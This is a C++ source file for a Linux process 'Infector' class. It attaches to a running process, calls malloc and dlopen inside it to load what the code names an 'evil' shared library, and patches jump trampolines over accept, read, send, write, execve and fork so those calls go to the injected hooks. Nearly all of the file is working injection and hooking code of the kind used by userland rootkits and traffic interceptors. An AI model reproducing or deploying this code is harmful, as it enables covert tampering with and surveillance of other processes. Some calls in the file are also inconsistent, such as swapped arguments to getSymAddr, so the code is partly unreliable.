#include "infector.h"
#include "target/targetopt.h"
#include "util/single.hpp"
#include "elf/elfopt.h"
#include "log/log.h"
extern "C"
{
#include "xed/xed-interface.h"
}

#include <assert.h>
#include <sys/user.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <dlfcn.h>

#define MAX_OPCODE_SIZE 30
#define JMP_SIZE 5
#define CALL_RAX_CMD "\xff\xd0\xcc\x90\x90\x90\x90\x90"
#define JMP_CMD 0xe9
#define MEM_SIZE 1000

using namespace lmc;

Infector::Infector(int pid_, const std::string &libcSoname) :
    mPid(pid_),
    mLicSoname(libcSoname)
{
    regvecInit();
    pNewRegs = static_cast<struct user_regs_struct *>(
               malloc(sizeof(struct user_regs_struct)));
    pOrigRegs = static_cast<struct user_regs_struct *>(
                malloc(sizeof(struct user_regs_struct)));
    pTargetOpt = new TargetOpt(pid_);

    xedd = static_cast<xed_decoded_inst_t *>(
               malloc(sizeof(xed_decoded_inst_t)));

    xed_tables_init();

    xed_state_t dstate;
    dstate.mmode=XED_MACHINE_MODE_LONG_64;
    xed_decoded_inst_zero_set_mode(xedd, &dstate);
}

Infector::~Infector()
{
    free(pNewRegs);
    free(pOrigRegs);
    delete pTargetOpt;
    mRegvec.clear();
    Elf64Wrapper *pElf = TypeSingle<Elf64Wrapper>::getInstance();
    pElf->clearAllSyms();
    free(xedd);
}

void Infector::regvecInit()
{
    mRegvec.resize(7);
    mRegvec[0] = [this](long parm)
    {
        pNewRegs->rax = parm;
    };
    mRegvec[1] = [this](long parm)
    {
        pNewRegs->rdi = parm;
    };
    mRegvec[2] = [this](long parm)
    {
        pNewRegs->rsi = parm;
    };
    mRegvec[3] = [this](long parm)
    {
        pNewRegs->rdx = parm;
    };
    mRegvec[4] = [this](long parm)
    {
        pNewRegs->rcx = parm;
    };
    mRegvec[5] = [this](long parm)
    {
        pNewRegs->r8 = parm;
    };
    mRegvec[6] = [this](long parm)
    {
        pNewRegs->r9 = parm;
    };
}

bool Infector::backupTarget()
{
    if (!pTargetOpt->readTarget(*pOrigRegs))
        return false;

    if (!pTargetOpt->readTarget(pOrigRegs->rip, backupCode, sizeof(backupCode)))
        return false;

    memcpy(pNewRegs, pOrigRegs, sizeof(struct user_regs_struct));   
    return true; 
}

bool Infector::updateTarget()
{
    if (!pTargetOpt->writeTarget(pNewRegs->rip, 
                                 CALL_RAX_CMD, 
                                 strlen(CALL_RAX_CMD)))
        return false;

    if (!pTargetOpt->writeTarget(*pNewRegs))
        return false;

    if (!pTargetOpt->contTarget())
        return false;
      
    int status;
    if (waitpid(mPid, &status, 0) < 0)
    {
        LOGGER_ERROR << "waitpid: " << strerror(errno);
        return false;
    }

    return true;
}

bool Infector::createThread(Elf64_Addr funcAddr, Elf64_Addr paramAddr)
{
    Elf64_Addr mmapAddr = getSymAddr(mLicSoname, "mmap");
    Elf64_Addr cloneAddr = getSymAddr(mLicSoname, "clone");
    int stackSize = 1024*1024*8;
    long mmapRetAddr = callRemoteFunc(mmapAddr, NULL, stackSize, 
                                      PROT_READ | PROT_WRITE, 
                                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_ANON,
                                      -1, 0);

    long cloneRetAddr = callRemoteFunc(cloneAddr, funcAddr,
                                       mmapRetAddr + stackSize,
                                       CLONE_VM | CLONE_FS | CLONE_THREAD | 
                                       CLONE_FILES | CLONE_SIGHAND | SIGCHLD, 
                                       paramAddr);

    return cloneRetAddr;
}

long Infector::restoreTarget()
{
    if (!pTargetOpt->readTarget(*pNewRegs))
        return 0;

    Elf64_Addr retAddr = pNewRegs->rax;

    if (!pTargetOpt->writeTarget(pOrigRegs->rip, 
                                 backupCode, 
                                 sizeof(backupCode)))
        return 0;

    if (!pTargetOpt->writeTarget(*pOrigRegs))
        return 0;

    return retAddr;
}

bool Infector::stepTarget()
{
    return pTargetOpt->stepTarget();
}

Elf64_Addr Infector::getSymAddr(const std::string &symname, 
                                const std::string &soname)
{
    Elf64Wrapper *pElf = TypeSingle<Elf64Wrapper>::getInstance();
    std::string soAllPath = "";
    Elf64_Addr baseAddr;

    if (!pTargetOpt->readTargetAllMaps())
        return false;

    auto &mapInfos = pTargetOpt->getMapInfo();
    if (soname.empty())
    {
        for (auto &m : mapInfos)
        {
            Elf64_Addr addr = pElf->getSymAddr(m.first, symname);
            if (addr)
                return addr;
        }
        return 0;
    }
    else
    {
        auto it = soMap.find(soname);
        if (it == soMap.end())
        {  
            for (auto &m : mapInfos)
            {
                if (strstr(m.first.c_str(), soname.c_str()))
                {
                    soAllPath = m.first;
                    break;
                }
            }

            if (soAllPath.empty())
                return false;

            soMap.insert(std::pair<std::string, std::string>(soname, 
                                                             soAllPath));
            it = soMap.find(soname);
        }
        
        return pElf->getSymAddr(it->second, symname);
    }
}

bool Infector::loadAllSoFile(bool update)
{
    if (update)
        pTargetOpt->clearMapInfos();

    if (!pTargetOpt->readTargetAllMaps())
        return false;

    auto &mapInfos = pTargetOpt->getMapInfo();

    LogLevel level = Logger::getLevel();
    Logger::setLevel(LogLevel::close);
    for (auto &m : mapInfos)
        loadSoFile(m.first);
    Logger::setLevel(level);

    return true;
}

bool Infector::loadSoFile(const std::string &soname, bool update)
{
    if (update)
        pTargetOpt->clearMapInfos();

    Elf64Wrapper *pElf = TypeSingle<Elf64Wrapper>::getInstance();
    std::string soAllPath;
    Elf64_Addr baseAddr;
    if (!pTargetOpt->readTargetAllMaps())
        return false;
    
    auto &mapInfos = pTargetOpt->getMapInfo();
    for (auto &m : mapInfos)
    {
        if (strstr(m.first.c_str(), soname.c_str()))
        {
            soAllPath = m.first;
            baseAddr = m.second;
            break;
        }
    }

    return pElf->loadSo(soAllPath, baseAddr);
}

bool Infector::attachTarget()
{
    return pTargetOpt->attachTarget();
}

bool Infector::detachTarget()
{
    return pTargetOpt->detechTarget();
}

bool Infector::injectEvilSoname(const std::string &evilsoname)
{
    mEvilSoname = evilsoname;
    if (!loadSoFile(mLicSoname))
    {
        LOGGER_ERROR << mLicSoname;
        return false;
    }

    Elf64_Addr mallocAddr = getSymAddr("malloc", mLicSoname);
    Elf64_Addr dlopenAddr = getSymAddr("__libc_dlopen_mode", mLicSoname);
    if (!mallocAddr || !dlopenAddr)
    {
        LOGGER_ERROR << "parse sym error:";
        LOGGER_ERROR << "malloc = " << mallocAddr;
        LOGGER_ERROR << "dlopen = " << dlopenAddr;
        return false;
    }

    Elf64_Addr retAddr = callRemoteFunc(mallocAddr, MEM_SIZE);
    if (!retAddr)
    {
        LOGGER_ERROR << "target process malloc failed";
        return false;
    }

    if (!writeStrToTarget(retAddr, mEvilSoname))
    {
        LOGGER_ERROR << "writeStrToTarget";
        return 0;
    }

    retAddr = callRemoteFunc(dlopenAddr, retAddr, RTLD_NOW|RTLD_GLOBAL, 0);
    if (!retAddr)
    {
        LOGGER_ERROR << "target process dlopen failed";
        return false;
    }

    if (!loadSoFile(mEvilSoname, true))
    {
        LOGGER_ERROR << "loadSoFile";
        return false;
    }

    return true;
}

bool Infector::readStrFromTarget(Elf64_Addr &addr, std::string &str, int size)
{
    char buffer[MEM_SIZE] = {0};
    bool ret = pTargetOpt->readTarget(addr, (void *)buffer, size);
    str = buffer;
    return ret;
}

bool Infector::writeStrToTarget(Elf64_Addr &addr, const std::string &str)
{
    return pTargetOpt->writeTarget(addr, (void *)str.c_str(), str.size());
}

Elf64_Addr Infector::syscallJmp(const std::string &syscall, 
                                const std::string &injectCall, 
                                const std::string &setSyscall, 
                                Elf64_Addr tmpAddr)
{
    Elf64_Addr syscallAddr = getSymAddr(syscall, mLicSoname);
    Elf64_Addr injectCallAddr = getSymAddr(injectCall, mEvilSoname);
    Elf64_Addr setSyscallAddr = getSymAddr(setSyscall, mEvilSoname);
    if (!syscallAddr || !injectCallAddr || !setSyscallAddr)
    {
        LOGGER_ERROR << "parse sym error";
        return false;
    }

    int offset = remoteFuncJump(syscallAddr, injectCallAddr, 
                                tmpAddr, setSyscallAddr);
    if (offset < 0) return tmpAddr;

    return tmpAddr + offset;
}

bool Infector::injectSysTableInit()
{
    if (mEvilSoname.empty())
        return false;

    Elf64_Addr mmapAddr = getSymAddr("mmap", mLicSoname);

    Elf64_Addr mmapRetAddr = callRemoteFunc(mmapAddr, 0, 4096, 
                                PROT_READ | PROT_WRITE | PROT_EXEC, 
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    assert(mmapRetAddr);

    mmapRetAddr = syscallJmp("accept", "_ZN6Inject12injectAcceptEiP8sockaddrPj", 
                             "_ZN6Inject13setAcceptAddrEm", mmapRetAddr);
    assert(mmapRetAddr);

    mmapRetAddr = syscallJmp("read", "_ZN6Inject10injectReadEiPvm", 
                             "_ZN6Inject11setReadAddrEm", mmapRetAddr);
    assert(mmapRetAddr);

    mmapRetAddr = syscallJmp("send", "_ZN6Inject10injectSendEiPKvmi", 
                             "_ZN6Inject11setSendAddrEm", mmapRetAddr);
    assert(mmapRetAddr);

    mmapRetAddr = syscallJmp("write", "_ZN6Inject11injectWriteEiPKvm", 
                             "_ZN6Inject12setWriteAddrEm", mmapRetAddr);
    assert(mmapRetAddr);

    mmapRetAddr = syscallJmp("execve", "_ZN6Inject12injectExecveEPKcPKPcS4_", 
                             "_ZN6Inject13setExecveAddrEm", mmapRetAddr);
    assert(mmapRetAddr);

    mmapRetAddr = syscallJmp("fork", "_ZN6Inject10injectForkEv", 
                             "_ZN6Inject11setForkAddrEm", mmapRetAddr);
    assert(mmapRetAddr);

    return true;
}

int Infector::remoteFuncJump(Elf64_Addr &srcAddr, 
                              Elf64_Addr &dstAddr, 
                              Elf64_Addr &tmpAddr,
                              Elf64_Addr &setAddr)
{
    unsigned char origCode[MAX_OPCODE_SIZE] = {0};
    if (!pTargetOpt->readTarget(srcAddr, origCode, sizeof(origCode)))
        return -1;

    callRemoteFunc(setAddr, 0, tmpAddr);

    unsigned char injectCode[8] = {0};
    injectCode[0] = JMP_CMD;
    int offset = dstAddr - srcAddr - 5;
    memcpy(&injectCode[1], &offset, 4);
    if (!pTargetOpt->writeTarget(srcAddr, injectCode, sizeof(injectCode)))
        return -1;

    int cmdOffset = 0;
    xed_state_t dstate;
    dstate.mmode=XED_MACHINE_MODE_LONG_64;

    while (cmdOffset < 8)
    {
        xed_decoded_inst_zero_set_mode(xedd, &dstate);
        xed_ild_decode(xedd, origCode + cmdOffset, XED_MAX_INSTRUCTION_BYTES);
        cmdOffset += xed_decoded_inst_get_length(xedd);
    }

    offset = srcAddr - tmpAddr - 5;
    origCode[cmdOffset] = JMP_CMD;
    memcpy(&origCode[cmdOffset+1], &offset, 4);
    if (!pTargetOpt->writeTarget(tmpAddr, origCode, sizeof(origCode)))
        return -1;
    
    return cmdOffset + JMP_SIZE;
}